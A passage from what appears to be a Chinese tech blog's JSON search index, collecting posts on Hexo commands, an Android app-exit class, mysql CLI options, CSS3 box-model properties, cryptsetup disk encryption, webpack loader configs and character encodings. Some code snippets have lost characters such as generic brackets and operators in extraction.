\"^0.1.3\",\n   \"hexo-generator-feed\": \"^1.1.0\",\n   \"hexo-generator-index\": \"^0.2.0\",\n   \"hexo-generator-sitemap\": \"^1.1.2\",\n   \"hexo-generator-tag\": \"^0.2.0\",\n   \"hexo-renderer-ejs\": \"^0.2.0\",\n   \"hexo-renderer-sass\": \"^0.2.0\",\n   \"hexo-renderer-jade\": \"^0.3.0\",\n   \"hexo-renderer-marked\": \"^0.2.10\",\n   \"hexo-renderer-stylus\": \"^0.3.1\",\n\nhexo\n\nnpm install hexo -g 安装\nnpm update hexo -g #升级\nhexo init #初始化\n简写\n\nhexo n \"我的博客\" == hexo new \"我的博客\" #新建文章\nhexo p == hexo publish\nhexo g == hexo generate#生成\nhexo s == hexo server #启动服务预览\nhexo d == hexo deploy#部署\n\n服务器\n\nhexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。\nhexo server -s #静态模式\nhexo server -p 5000 #更改端口\nhexo server -i 192.168.1.1 #自定义 IP\n\nhexo clean #清除缓存 网页正常情况下可以忽略此条命令\nhexo g #生成静态网页\nhexo d #开始部署\npython -m SimpleHTTPServer\n监视文件变动\n\nhexo generate #使用 Hexo 生成静态文件快速而且简单\nhexo generate --watch #监视文件变动\n\n完成后部署\n\n两个命令的作用是相同的\nhexo generate --deploy\nhexo deploy --generate\nhexo deploy -g\nhexo server -g\n\n草稿\n\nhexo publish [layout] title\n\n模版\n\nhexo new \"postName\" #新建文章\nhexo new page \"pageName\" #新建页面\nhexo generate #生成静态页面至public目录\nhexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）\nhexo deploy #将.deploy目录部署到GitHub\n\nhexo new [layout] title\nhexo new photo \"My Gallery\"\nhexo new \"Hello World\" --lang tw\n\n模版（Scaffold）\n\nhexo new photo \"My Gallery\"\n\n设置文章摘要\n\n以上是文章摘要 !--more-- 以下是余下全文\n写作\n\nhexo new page title\nhexo new post title\n\n变量  描述\n:title  标题\n:year   建立的年份（4 位数）\n:month  建立的月份（2 位数）\n:imonth    建立的月份（去掉开头的零）\n:day    建立的日期（2 位数）\n:iday  建立的日期（去掉开头的零）\n推送到服务器上\n\nhexo n #写文章\nhexo g #生成\nhexo d #部署 #可与hexo g合并为 hexo d -g\n\n报错\n\n1.找不到git部署\n\nERROR Deployer not found: git\n解决方法\n\nnpm install hexo-deployer-git --save\n\n3.部署类型设置git\n\nhexo 3.0 部署类型不再是github，config.yml 中修改\n\nDeployment\n Docs: http://hexo.io/docs/deployment.html\ndeploy:\n  type: git\n  repository: git@.github.com:/***.github.io.git\n  branch: master\nxcodebuild\n\nxcode-select: error: tool 'xcodebuild' requires Xcode, but active developer directory '/Library/Developer/CommandLineTools' is a command line tools instance\n\nnpm install bcrypt\n\nRSS不显示\n\n安装RSS插件\n\nnpm install hexo-generator-feed --save\n\n开启RSS功能\n\n编辑hexo/config.yml，添加如下代码：\n\nrss: /atom.xml #rss地址  默认即可\n0x04 创建项目\n hexo init rinetd\n hexo new rinetd\n hexo g\n 0x05 主题安装\n maupassant\ngit clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant\nnpm install hexo-renderer-sass --save\nnpm install hexo-renderer-jade --save\n\n0x06 配置多说\n 申请多说开发者帐号注册\n 测试帐号\n\n 0x07 配置disqus\n  申请Disqus帐号\n\nhttp://segmentfault.com/a/1190000002632530","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用技巧 结束所有应用","title":"在Android开发中，如何结束整个应用程序","text":"我想做一个，点击按钮：关闭应用。就可以，结束整个，应用程序的功能。 北风某尸 和 班长小崔给提供了两种解决方案，仔细想想，都有道理！然后，参考了网上的一些代码，成功的将整个应用程序关闭。\n\n解决思路：\n\n1、建立List集合，将所有的Acitivty 都存进，集合里——private ListActivity activityList = new LinkedListActivity();\n\n2、结束整个应用程序时，将遍历集合，将Activity 逐个 kill 。\n\n下面是具体实现代码：\n\n[java] view plain copy\nprint?在CODE上查看代码片派生到我的代码片\n\n    package com.zwhy.networktest;  \n\n    import java.util.LinkedList;  \n    import java.util.List;  \n\n    import android.app.Activity;  \n    import android.app.Application;  \n\n    public class ActivityManager extends Application {  \n        //建立链表集合  \n        private ListActivity activityList = new LinkedListActivity();  \n\n        //用单例模式，保证，这个ActivityManager 在整个应用中只有一个  \n        private static ActivityManager instance;  \n\n        private ActivityManager() {  \n\n        }  \n\n        public static ActivityManager getInstance() {  \n            if (instance == null) {  \n                instance = new ActivityManager();  \n            }  \n            return instance;  \n        }  \n\n        //向链表中，添加Activity  \n        public void addActivity(Activity activity) {  \n            activityList.add(activity);  \n        }  \n\n        //结束整个应用程序  \n        public void exit() {  \n\n            //遍历 链表，依次杀掉各个Activity  \n            for (Activity activity : activityList) {  \n                if (!activity.isFinishing()) {  \n                    activity.finish();  \n                }  \n            }  \n            //杀掉，这个应用程序的进程，释放 内存  \n            int id = android.os.Process.myPid();  \n            if (id != 0) {  \n                android.os.Process.killProcess(id);  \n            }  \n        }  \n    }  \n\n具体使用的时候，需要，在每一个Activity中，获取 ActivityManager 的实例，然后，将Activity，添加到，List 中。\n\n1、获取 ActivityManager 的实例对象：\n\nActivityManager exitM = ActivityManager.getInstance();\n\n2、添加各个 Activity\n\nexitM.addActivity(MainActivity.this);\n\n关闭整个应用程序的时候，只需要，最后一句：\n\nexitM.exit();\n\n便可 大功告成！","tags":null},{"location":"//blog.pytool.com/Post/数据库/mysql命令","title":"mysql 命令行你知多少","text":"---\n\nmysql 命令行你知多少\n\n张映 发表于 2010-10-19\n\n分类目录： mysql\n\n标签：mysql, 实例, 手册\n\nmysql -u root -p 等这些常用的参数外，你知道多少？来测试一下吧\n\n一，mysql命令行参数\n查看复制打印?\n    Usage: mysql [OPTIONS] [database]   //命令方式  \n     -?, --help          //显示帮助信息并退出  \n     -I, --help          //显示帮助信息并退出  \n     --auto-rehash       //自动补全功能，就像linux里面，按Tab键出提示差不多，下面有例子  \n\n     -A, --no-auto-rehash  //默认状态是没有自动补全功能的。-A就是不要自动补全功能  \n     -B, --batch         //ysql不使用历史文件，禁用交互  \n     (Enables --silent)  \n     --character-sets-dir=name   //字体集的安装目录                      \n     --default-character-set=name    //设置数据库的默认字符集  \n     -C, --compress      //在客户端和服务器端传递信息时使用压缩  \n     -#, --debug[=#]     //bug调用功能  \n     -D, --database=name //使用哪个数据库  \n     --delimiter=name    //mysql默认命令结束符是分号，下面有例子  \n     -e, --execute=name  //执行mysql的sql语句  \n     -E, --vertical      //垂直打印查询输出  \n     -f, --force         //如果有错误跳过去，继续执行下面的  \n     -G, --named-commands  \n     /Enable named commands. Named commands mean this program's\n     internal commands; see mysql  help . When enabled, the\n     named commands can be used from any line of the query,\n     otherwise only from the first line, before an enter.\n     Disable with --disable-named-commands. This option is\n     disabled by default./  \n     -g, --no-named-commands  \n     /Named commands are disabled. Use \\ form only, or use\n     named commands only in the beginning of a line ending\n     with a semicolon (;) Since version 10.9 the client now\n     starts with this option ENABLED by default! Disable with\n     '-G'. Long format commands still work from the first\n     line. WARNING: option deprecated; use\n     --disable-named-commands instead./  \n     -i, --ignore-spaces //忽视函数名后面的空格.  \n     --local-infile      //启动/禁用 LOAD DATA LOCAL INFILE.  \n     -b, --no-beep       //sql错误时，禁止嘟的一声  \n     -h, --host=name     //设置连接的服务器名或者Ip  \n     -H, --html          //以html的方式输出  \n     -X, --xml           //以xml的方式输出  \n     --line-numbers      //显示错误的行号  \n     -L, --skip-line-numbers  //忽略错误的行号  \n     -n, --unbuffered    //每执行一次sql后，刷新缓存  \n     --column-names      //查寻时显示列信息，默认是加上的  \n     -N, --skip-column-names  //不显示列信息  \n     -O, --set-variable=name  //设置变量用法是--set-variable=varname=varvalue  \n     --sigint-ignore     //忽视SIGINT符号(登录退出时Control-C的结果)  \n     -o, --one-database  //忽视除了为命令行中命名的默认数据库的语句。可以帮跳过日志中的其它数据库的更新。  \n     --pager[=name]      //使用分页器来显示查询输出，这个要在linux可以用more,less等。  \n     --no-pager          //不使用分页器来显示查询输出。  \n     -p, --password[=name] //输入密码  \n     -P, --port=#        //设置端口  \n     --prompt=name       //设置mysql提示符  \n     --protocol=name     //使用什么协议  \n     -q, --quick         //不缓存查询的结果，顺序打印每一行。如果输出被挂起，服务器会慢下来，mysql不使用历史文件。  \n     -r, --raw           //写列的值而不转义转换。通常结合--batch选项使用。  \n     --reconnect         //如果与服务器之间的连接断开，自动尝试重新连接。禁止重新连接，使用--disable-reconnect。  \n     -s, --silent        //一行一行输出，中间有tab分隔  \n     -S, --socket=name   //连接服务器的sockey文件  \n     --ssl               //激活ssl连接，不激活--skip-ssl  \n     --ssl-ca=name       //CA证书  \n     --ssl-capath=name   //CA路径  \n     --ssl-cert=name     //X509 证书  \n     --ssl-cipher=name   //SSL cipher to use (implies --ssl).  \n     --ssl-key=name      //X509 密钥名  \n     --ssl-verify-server-cert //连接时审核服务器的证书  \n     -t, --table         //以表格的形势输出  \n     --tee=name          //将输出拷贝添加到给定的文件中，禁时用--disable-tee  \n     --no-tee            //根--disable-tee功能一样  \n     -u, --user=name     //用户名  \n     -U, --safe-updates  //Only allow UPDATE and DELETE that uses keys.  \n     -U, --i-am-a-dummy  //Synonym for option --safe-updates, -U.  \n     -v, --verbose       //输出mysql执行的语句  \n     -V, --version       //版本信息  \n     -w, --wait          //服务器down后，等待到重起的时间  \n     --connecttimeout=# //连接前要等待的时间  \n     --maxallowedpacket=# //服务器接收／发送包的最大长度  \n     --netbufferlength=# //TCP / IP和套接字通信缓冲区大小。  \n     --selectlimit=#    //使用--safe-updates时SELECT语句的自动限制  \n     --maxjoinsize=#   //使用--safe-updates时联接中的行的自动限制  \n     --secure-auth       //拒绝用(pre-4.1.1)的方式连接到数据库  \n     --server-arg=name   //Send embedded server this as a parameter.  \n     --show-warnings     //显示警告  \n二，mysql命令行实例\n\n1，auto-rehash自动补全\n\n说例子前，先说一下，你到google或baidu上面搜一下mysql auto-rehash，然后会出来结果，绝大部分都是一样的，并且内容里面有明显错误。mysqldsafe --user=mysql --auto-rehash \u0026，这个根本就不对，为什么抄袭的人不知道自己测试一下，对于这种人，我也是很无语的。你自己写着玩到也无所谓，但是你会害人的。\n\n[root@BlackGhost zhangy]# mysqldsafe --help |grep rehash\n\n参数选项中根本没有auto-rehash\n\n二种方法可以实现自动补全功能\n－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－\n[mysql]\nno-auto-rehash\nauto-rehash\n－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－\nmysql -u root --auto-rehash\n－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－    \n查看复制打印?\n\n    mysql  use test  \n     Database changed  \n     mysql  select acc    //这里自动补全，只是提示表名，和表里面的字段名，不像php可以提示函数名  \n     account           account.acctnum  account.amount    acctnum  \n\n2，－B的用法\n查看复制打印?\n\n    D:\\xampp\\mysql\\bin  mysql.exe -uroot -D baktest -e \"show tables;\" -B  \n    Tablesinbaktest  \n    comment  \n    user  \n\n3，－E的用法\n查看复制打印?\n\n    D:\\xampp\\mysql\\bin  mysql.exe -uroot baktest -e \"show tables;\" -E  \n    *********************** 1. row *********************  \n    Tablesinbaktest: comment  \n    ********************* 2. row ************************  \n    Tablesinbaktest: user  \n\n4，－D的用法\n\n    [root@BlackGhost zhangy] mysql -u root -D test  \n\n进入后默认就在test数据库里面，不要用use test;\n\n5，--default-character-set设置默认字符集\n查看复制打印?\n\n    [root@BlackGhost zhangy]# mysql -u root -D test  --default-character-set=utf8  \n\n6，--delimiter设置mysql命令结束符\n\n    [root@BlackGhost zhangy]# mysql -u root -D test   --delimiter=\\|  \n\nmysql默认的命令结束符是分号，现在把它设置成竖杠，要注意｜前面的\\\n\n7，-e的用法\n查看复制打印?\n\n    D:\\xampp\\mysql\\bin  mysql.exe -uroot -D baktest -e \"show tables;\"  \n\n这个很有用的，因为我不用进入mysql客户里面去，就能把我要的数据取出来，这个可以配合shell脚本的话，能发挥很大的功能\n\n8，-f的用法\n查看复制打印?\n\n    D:\\xampp\\mysql\\bin  mysql.exe -uroot bak_test -e \"show databaseds;show tables;\" -  \n    f  \n    ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the ma  \n    nual that corresponds to your MySQL server version for the right syntax to use n  \n    ear 'databaseds' at line 1  \n    +","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/web技术第八弹 CSS3盒子模型增强属性","title":"web技术第八弹 CSS3盒子模型增强属性","text":"---\n\nweb技术第八弹 CSS3盒子模型增强属性\n\nspan class=\"spacer l\"2016-04-06 17:59:06/span span class=\"spacer l spacer-2\"1314浏览/span a href=\"#comment\" class=\"spacer l\"1评论/a\n\n      前一弹讲述了在CSS中，盒子模型的相关标准属性和布局简单应用。这一弹，我们会继续讲述盒子模型，并了解在新的CSS3标准下，盒子模型的背景和边框，都有哪些新的增强属性可以设置。\n      ​ 首先，我们看下盒子的页面重叠以及内部元素溢出的相关属性。由于设定了盒子的浮动和定位，这样盒子可能会有重叠，见图。重叠相关的属性设置原则：\n\n一、设定了static的盒子不受任何影响，总是在最底层\n二、设定了其他position属性的盒子，可以再设定z-index属性。 属性值越高，就会越显示在顶部\n三、z-index的属性不可继承\n       由于盒子可能不够大（显式设置了宽度和高度的情况下），内部的元素可能会放不下。可以对其应用overflow等属性。如下：\n一、 overflow属性:\n       visible 默认值，溢出的部分会显示出来\n       auto 内容会被修建，溢出的部分用滚动条移动显示\n       hidden 溢出部分不显示\n       scroll 溢出部分用滚动条显示\n       inherit 继承父元素的属性\n\n二、盒子的水平和垂直方向做溢出属性的设置。应用overflow-x和overflow-y (IE8以上支持）\n\n三、对于设置了文本white-space为nowrap（文本不换行）的元素，设置text-overflow的属性，可以使尾部截断的部分显示出一个…的效果。注意写法：\n              white-space : nowrap; ​\n              text-overflow : ellipsis;\n              -webkit-text-overflow : ellipsis;\n              -o-text-overflow : ellipsis;\n      \n盒子的宽度和高度，有对应的一些属性可以设置如下：\n\n      这里还是要注意，CSS默认的宽度是指内容的宽度。如果指定了内外边距和边框而又要固定宽度的话，记得要用 box-sizing属性更改一下。\n\n​        之前我们谈过，盒子的背景有一些基本属性：颜色、图片来源、重复、滚动和显示位置。在此基础上，CSS3对背景，做了一些新的增强属性设置。可以在一个盒子里显示多个背景图片；整个盒子，可以设置阴影；之前默认的背景范围也可以做自定义。见下面的图解：\n\n      此外，CSS3增加了对边框的高级设置。很多原先只能依赖于美工切图再放置的功能，可以用CSS3属性直接实现，例如盒子边框的圆角设置和边框图片放置。\n\n      了解了以上这些盒子模型的属性，大家就可以发动脑洞，在页面上做出各种复杂的盒子模块了。当然CSS3在具体的浏览器上的实现还有不完全一致或者支持的地方，主要注意几点：\n一、很多CSS3的新属性，针对不同的浏览器要可能需要重复加上前缀分别书写。-webkit- ， -o- ，-moz- ， -ms\n二、强烈推荐 www.caniuse.com 这个网站做具体属性值的浏览器版本兼容预审，输入属性，他会很详细的列出最新的浏览器兼容情况作为参考。例如我输入border-image 就能知道IE需要从IE11才开始支持。\n\n       下一弹，我们来看看，在CSS3中增加了那几种新的盒子模型以及他们在页面布局上是如何使用的。也许是时候该抛弃float和clear方法了。\n\nspan class=\"l\"相关标签：/span a href=\"/article/tag/5\" class=\"cat l\"Html/CSS/a a href=\"/article/tag/14\" class=\"cat l\"Html5/a a href=\"/article/tag/25\" class=\"cat l\"CSS3/a\n\nspan class=\"icon-thumbo\"/span\n\nspan class=\"num\"15/span span class=\"person\"人/span推荐\n\nspan分享即可 +/span1积分 span class=\"rule-arrow\"/span\n\na href=\"#\" class=\"bdsweixin icon-nav icon-share-weichat\" title=\"分享到微信\"/a a href=\"#\" class=\"bdstsina icon-nav icon-share-weibo\" title=\"分享到新浪微博\"/a a href=\"#\" class=\"bdsqzone icon-nav icon-share-qq\" title=\"分享到QQ空间\"/a\n\nspan id=\"js-follow\" class=\"dc-follow l\" data-id=\"6265\" span收藏/span /span\n\nspanimg src=\"http://img.mukewang.com/images/avatardefault.png\" width=\"40\" //span\n\n请登录后，发表评论\n评论（Enter+Ctrl）\n\n热门评论\n\n评论加载中...\n\n全部评论span class=\"comment-num\"**条/span\n\n评论加载中...\n\na href=\"/u/438321/articles\" class=\"l\" title=\"键盘大官人\"img src=\"http://img.mukewang.com/56cf2a6d0001e87f01790182-100-100.jpg\" //a\n\na href=\"/u/438321/articles\" class=\"nick\" title=\"键盘大官人\"键盘大官人/a\n\nspan class=\"user-job\"产品经理/span span class=\"user-desc\" 做懂技术的产品经理，做最懂营销的技术开发 /span\na href=\"/u/438321/articles\" class=\"article-num r-bor l\"span/span篇手记/a a href=\"/u/438321/articles?type=praise\" class=\"article-recom l\"span/span推荐/a\n\n作者的热门手记","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 lvm2-Cryptsetup","title":"Linux命令 Cryptsetup","text":"在Linux系统中，基于DEVICE MAPPER机制对设备进行管理，通过在物理设备和逻辑设备之间创建mapping，从而在系统中通过对逻辑设备的操作实现对物理设备的操作。device mapper机制主要包括三个部分：用户空间部分、内核部分和dm-setup。在本文中，将介绍如何使用cryptsetup对存储设备进行加密。\n\n1 设置系统内核\n1.1 查看系统是否有crypto加密模块\ncat /proc/crypto //ook over crypt methods , eg. aes\n如果模块不存在，使用如下命令进行安装：\nsudo modprobe aes\n1.2 安装dmsetup、cryptsetup\nsudo apt-get install dmsetup cryptsetup\n1.3 加载dm-crypt内核模块\n首先查看dmsetup是否已经建立了映像\nls -l /dev/mapper/control //接下来加载dm-crypt内核模块\n已经建立映像之后加载dm-crypt内核模块，使用如下命令：\nsudo modprobe dm-crypt  //dm-crypt加载后，device-mapper自动注册\n成功加载之后，查看是否已经正确安装：\nsudo dmsetup targets //如果一切顺利，目前你应该看到crypt的下列输出：\ncrypt            v1.1.0\nstriped          v1.0.2\nlinear           v1.0.1\nerror            v1.0.1\n2 建立加密设备\n为当便后期使用，直接使用物理设备进行安装测试。\n2.1 首先使用cryptsetup来建立逻辑卷，并将其和块设备即物理设备捆绑：\nsudo cryptsetup -y create myEncryptedFilesystem /dev/sdb4  //myEncryptedFilesystem 是新建的逻辑卷的名称，/dev/sdb4是将用作加密卷的块设备\n/\n查看物理设备号可以使用如下命令进行查看：\nsudo fdisk -l\n/\n为了确认逻辑卷是否已建立，能使用下列命令进行检查一下：\nsudo dmsetup ls //只要该命令列出了逻辑卷，就说明已成功建立了逻辑卷\n2.2 在创建完成的逻辑卷即虚拟设备上创建文件系统，进行文件存储\nsudo mkfs.ext3 /dev/mapper/myEncryptedFilesystem  //文件系统创建为ext3文件系统\n文件系统创建成功后，需要在/mnt文件分区下建立装载点，然后才能将其挂载，创建文件夹命令如下：\nsudo mkdir /mnt/myEncryptedFilesystem\n文件夹创建完成，将其挂载到新建挂载点/mnt/myEncryptedFilesystem下：\nsudo mount /dev/mapper/myEncryptedFilesystem  /mnt/myEncryptedFilesystem\n使用如下命令查看其装载后的情况，可以看到文件系统的名称和大小，以及可以使用的空间：\ndf -h /mnt/myEncryptedFilesystem\nFilesystem              Size  Used Avail Use% Mounted on\n/dev/mapper/myEncryptedFilesystem     97M  2.1M   90M   2% /mnt/myEncryptedFilesystem\n/\n仔细观察可以发现，此处的文件系统大小即为物理设备空间大小\n加密文件系统建立并加载后，可以对其进行正常的文件读写存储,与普通文件系统在这方面没有差别\n但是在该文件系统下存储的文件均为密文存储\n/\n3 卸载加密设备\n卸载加密设备，和普通设备卸载方法相同：\nsudo umount /mnt/myEncryptedFilesystem\n/\n卸载之后，在dm-crypt中仍然还可以看到有一个虚拟设备，再次装载设备的时候不需要输入口令认证即可\n/\n为了保证设备安全性，需要将设备以及逻辑卷全部删除:\nsudo cryptsetup remove myEncryptedFilesystem\n/\n完全卸载后，再次装载设备时，需要进行口令认证\n/\n\n/\n完全卸载加密设备已经写入shell脚本umountatuo.sh\nsudo ./umountauto.sh\n/\n\n[plain] view plain copy\n!/bin/sh  \numount /mnt/myFilesystem  \ncryptsetup remove myEncryptedFilesystem  \n\n4 重新装载\n4.1 在卸载加密设备后，我们非常可能还需作为普通用户来装载他们。为了简化该工作，我们需要在/etc/fstab文件中添加下列内容：\n/dev/mapper/myEncryptedFilesystem  /mnt/myEncryptedFilesystem  ext3 noauto,noatime 0 0\n[html] view plain copy\n/etc/fstab 包含了电脑上所有的存储设备及其文件系统的信息，是决定一个硬盘（分区）被怎样使用或者说将设备整合到整个系统中的唯一文件  \n    ****************   内容解析  **************************  \n    文件中共有如下参数 ： file systemdirtypeoptionsdumppass  \n    file system ： 即设备的名称  \n    dir : 设备装载的路径  \n    type ： 设备的文件系统类型  \n    options ：能使所挂载的设备在开机时自动加载、使中文显示不出现乱码、限制对挂载分区读写权限等多种功能，具体参数如下：  \n    noatime   关闭atime特性，提高性能，这是一个很老的特性，放心关闭，还能减少loadcycle  \n    defaults  使用默认设置。等于rw,suid,dev,exec,auto,nouser,async，具体含义看下面的解释  \n    auto  在启动或在终端中输入mount -a时自动挂载  \n    noauto  设备（分区）只能手动挂载 The file system can be mounted only explicitly  \n    IO编码设置 ：  \n    iocharset＝   在＝号后面加入你的本地编码，在这个设备（分区）中做文件IO的时候就会自动做编码的格式转换。  \n    中文乱码的解决 ：  \n    nls=     在=号后面加入你的本地编码，你的中文就不会出现乱码  \n    可执行 ：  \n    exec     是一个默认设置项，它使在那个分区中的可执行的二进制文件能够执行。  \n    noexec  二进制文件不允许执行  \n    I/O同步 ：  \n    sync    所有的I/O将以同步方式进行  \n    async  所有的I/O将以非同步方式进行  \n    用户挂载权限 :  \n    user  允许任何用户挂载设备。 Implies noexec,nosuid,nodev unless overridden.  \n    nouser  只允许root用户挂载。这是默认设置。  \n    dump :是dump utility用来决定是否做备份的.允许的数字是0和1。如果是0，dump就会忽略这个文件系统，如果是1，dump就会作一个备份。  \n    pass :fsck会检查这个头目下的数字来决定检查文件系统的顺序.允许的数字是0, 1, 和2.0将不会被fsck utility检查。root文件系统应该拥有最高的优先权， 1                  ，而所有其它的文件系统，如果你想让它被check的话，应该写成2  \n        在和老师交流以及自己测试之后，发现了/etc/fstab的用途，简单来说，就是通过在/etc/fstab文件中添加一条命令，可以简化加载输入。如在/etc/fstab文件中加入/dev/mapper/myEncryptedFilesystem  /mnt/myEncryptedFilesystem 之后，可以直接使用span style=\"color:ff6666;\"sudo mount /dev/mapper/myEncryptedFilesystem/span命令在加载设备，然后/dev/mapper/myEncryptedFilesystem就会按照/etc/fstab文件中添加的命令一样，挂载到/mnt/myEncryptedFilesystem 挂载点目录下。如果没有加入这条命令，那么需要使用span style=\"color:#ff6666;\"sudo mount /dev/mapper/myEncryptedFilesystem  /mnt/myEncryptedFilesystem/span命令才能将设备挂载。  \n4.2 装载设备\n\n在测试中使用shell脚本进行创建设备和装载设备\n/\nremount.sh脚本实现重载设备功能\nsudo ./remount.sh\n*/\n!/bin/sh  \ncryptsetup create myEncryptedFilesystem  /dev/sdb4  \nmount /dev/mapper/myEncryptedFilesystem  /mnt/myFilesystem  \n\n5 总结\ncrptsetup是一款能够将设备进行加密的软件，使用时需要先创建本地的逻辑卷即逻辑设比，并通过dmsetup将逻辑设备和物理设备进行mapping，从而将对逻辑设备的操作映射到物理设备。在进行文件存储时，需要先对逻辑设备创建文件系统，并在/mnt文件分区下建立挂载点，将其mount到该挂载点之后，才能对其进行正常操作。一次操作结束之后，需要将设备完全卸载，保证下次装载的安全。\n当再一次对物理设备重新装载使用时，只需要重新建立逻辑卷并和物理设备绑定即可，此时需要输入口令进行确认，只有正确输入口令才能够正常挂载，否则无法成功挂载。此外，重新装载不许要重新创建文件系统，否则会将原有数据全部删除。\n物理设备（U盘）在加密映射之后，只能通过建立逻辑设备并进行绑定才能够读写，直接连接PC（WIN 、LINUX）只能识别无法操作。但在WIN下可以将其格式化，且无法恢复数据。\n当在其他PC上对设备进行读写操作时，也需要建立逻辑设备并对其绑定才能够正常操作。\n\n参考地址：\n[1]http://blog.sina.com.cn/s/blog_600e39a801011mo7.html\n[2]http://ckc620.blog.51cto.com/631254/394238\n\n欢迎大家查看交流，下一篇将介绍CRYPTSETUP加密存储设备之二（Android篇）","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 webpack url-loader","title":"wepack3 url-loader","text":"module: {\n  rules: [\n    {\n      test: /\\.js$/,\n      use: 'babel-loader?cacheDirectory', // 开启 babel-loader 缓存\n      include: [path.resolve('src'), path.resolve('test')],\n      exclude: /nodemodules/\n    },\n    {\n      test: /\\.(css|scss)$/,\n      use: ['style-loader', 'css-loader', 'postcss-loader', 'sass-loader']\n    },\n    {\n      test: /\\.(png|jpe?g|gif|svg)(\\?.)?$/i,\n      loader: 'url-loader',\n      options: {\n        limit: 10  1024,\n        name: 'images/[name].[ext]?[hash]'\n      }\n    },\n    {\n      test: /\\.(mp4|webm|ogg|mp3|wav|flac|aac)(\\?.)?$/,\n      loader: 'url-loader',\n      options: {\n        limit: 10  1024,\n        name: 'media/[name].[ext]?[hash]'\n      }\n    },\n    {\n      test: /\\.(woff2?|eot|ttf|otf)(\\?.)?$/,\n      loader: 'url-loader',\n      options: {\n        limit: 10  1024,\n        name: 'fonts/[name].[ext]?[hash]'\n      }\n    }\n  ]\n},\n\nmodule: {\n     rules: [\n         {\n             // 后缀正则\n             test: /\\.js$/,\n             // 加载器组\n             use: [\n                 {\n                     loader: 'babel-loader',\n                 },\n                 {\n                     loader: 'eslint-loader',\n                 },\n             ],\n             exclude: /nodemodules/,\n         },\n         {\n             test: /\\.less$/,\n             use: ExtractTextPlugin.extract({\n                 fallback: 'style-loader',\n                 use: [\n                     'css-loader',\n                     'postcss-loader',\n                     'less-loader',\n                 ],\n             }),\n             exclude: /nodemodules/,\n         },\n\n         {\n             test: /\\.(woff|woff2)(\\?v=\\d+\\.\\d+\\.\\d+)?$/,\n             use: [\n                 {\n                     loader: 'url-loader',\n                     options: {\n                         name: 'path.[ext]',\n                         limit: 10240,\n                         mimetype: 'application/font-woff',\n                     }\n                 },\n             ],\n             // loaders: ['url-loader?\u0026limit=102400\u0026mimetype=application/font-woff'],\n         },\n         {\n             test: /\\.ttf(\\?v=\\d+\\.\\d+\\.\\d+)?$/,\n             use: [\n                 {\n                     loader: 'url-loader',\n                     options: {\n                         name: 'path.[ext]',\n                         limit: 10240,\n                         mimetype: 'application/octet-stream',\n                     }\n                 },\n             ],\n             // loaders: 'url-loader?name=[path.[ext]\u0026limit=1024\u0026mimetype=application/octet-stream'],\n         },\n         {\n             test: /\\.eot(\\?v=\\d+\\.\\d+\\.\\d+)?$/,\n             use: [\n                 {\n                     loader: 'file-loader',\n                     options: {\n                         name: 'path.[ext]',\n                     }\n                 },\n             ],\n             // loaders: 'file-loader?name=[path.[ext]'],\n         },\n         {\n             test: /\\.svg(\\?v=\\d+\\.\\d+\\.\\d+)?$/,\n             use: [\n                 {\n                     loader: 'url-loader',\n                 },\n             ],\n             // loaders: 'url-loader?name=[path.[ext]\u0026limit=1024\u0026mimetype=image/svg+xml'],\n         },\n         {\n             test: /\\.(png|jpg|gif)$/,\n             use: [\n                 {\n                     loader: 'url-loader',\n                 },\n             ],\n             // loaders: 'url-loader?name=[path.[ext]?[hash]\u0026limit=204800000'], // 单位bit\n             exclude: /nodemodules/,\n         },\n     ],\n },\n`","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-20-encoding","title":"编码总结","text":"编码与解码\n计算机用二进制存储信息。将英文、汉字等符号转成二进制称作编码，反之，将二进制解析成对应的英文、汉字等符号称作解码。\n字符集与字符编码\n字符集（Charset）是一个系统支持的所有抽象字符的集合。字符是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。\n字符编码（Character Encoding）：是一套法则，使用该法则能够对自然语言的字符的一个集合（如字母表或音节表），与其他东西的一个集合（如号码或电脉冲）进行配对。\n常用字符集和字符编码\n\n ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语。\n GB2312或GB2312-80是中国国家标准 简体中文 字符集，收录6763个汉字，它所收录的汉字已经覆盖中国大陆99.75%的使用频率。\n GBK是对GB2312-80的扩展，微软利用GB2312-80未使用的编码空间，收录GB 13000.1-93全部字符制定了GBK编码，并非国家标准。 \n GB18030，全称：国家标准 GB18030-2005《信息技术 中文编码字符集》，是中华人民共和国现时最新的内码字集   \n Big5，又称为大五码或五大码，是使用繁体中文 （正体中文）社区中最常用的电脑汉字字符集标准，共收录13,060个汉字。\n Unicode编码系统为表达任意语言的任意字符而设计。它使用4字节的数字来表达每个字母、符号，或者表意文字(ideograph)。每个数字代表唯一的至少在某种语言中使用的符号。\n    \n \nUnicode\n在表示一个Unicode的字元时，通常会用“U+”然后紧接着一组十六进制的数字来表示这一个字元\n\n编码方式：\n统一码的编码方式与ISO 10646的通用字符集(UCS)概念相对应。目前实际应用的统一码版本对应于UCS-2，使用16位的编码空间。也就是每个字符占用2个字节。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。\n实现方式：\nUnicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为Unicode转换格式（Unicode Transformation Format，简称为UTF）\n\nUTF-32 : 使用4个字节的数字来表达每个符号的编码方案称为UTF-32\n\nUTF-16 : 尽管有Unicode字符非常多，但是实际上大多数人不会用到超过前65535个以外的字符。因此，就有了另外一种Unicode编码方式，叫做UTF-16(因为16位 = 2字节)。UTF-16将0–65535范围内的字符编码成2个字节，如果真的需要表达那些很少使用的\"星芒层(astral 